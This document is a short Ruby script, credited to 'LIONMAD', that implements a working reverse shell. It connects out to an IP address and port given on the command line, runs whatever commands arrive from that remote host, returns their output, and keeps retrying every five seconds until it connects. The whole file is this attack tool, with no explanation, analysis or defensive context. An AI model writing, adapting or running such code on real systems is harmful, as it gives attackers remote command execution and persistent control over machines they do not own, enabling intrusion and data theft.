#!/usr/bin/ruby
#Coded by LIONMAD
require 'socket'

# Check if IP and PORT are provided as arguments
if ARGV.length != 2
    puts "Usage: #{$0} <IP> <PORT>"
    exit 1
end

ip = ARGV[0]
port = ARGV[1].to_i

loop do
    begin
        c = TCPSocket.new(ip, port)
        while cmd = c.gets
            IO.popen(cmd, "r") { |io| c.print io.read }
        end
        break
    rescue => e
        puts "Connection failed: #{e}, retrying in 5 seconds..."
        sleep 5
    end
end
